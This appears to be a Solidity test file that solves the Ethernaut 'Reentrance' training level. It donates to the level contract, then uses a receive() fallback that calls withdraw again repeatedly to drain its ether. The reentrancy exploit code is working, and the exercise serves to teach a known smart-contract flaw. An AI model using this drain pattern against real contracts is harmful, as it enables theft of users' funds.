pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../../src/Reentrance/ReentranceHack.sol";
import "../../src/Reentrance/ReentranceFactory.sol";
import "../../src/Ethernaut.sol";
import "../utils/vm.sol";

contract ReentranceTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 3 ether);
    }

    function testReentranceHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        ReentranceFactory reentranceFactory = new ReentranceFactory();
        ethernaut.registerLevel(reentranceFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(reentranceFactory);
        ethernautReentrance = Reentrance(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        vm.stopPrank();
        ethernautReentrance.donate{value: 0.1 ether}(address(this));
        ethernautReentrance.withdraw(0.1 ether);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        vm.startPrank(eoaAddress);
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
    
    Reentrance ethernautReentrance;
    uint hasReceived = 10;
    receive() external payable {
        if (hasReceived != 0) {
            hasReceived--;
            ethernautReentrance.withdraw(0.1 ether);
            
        }
    }
}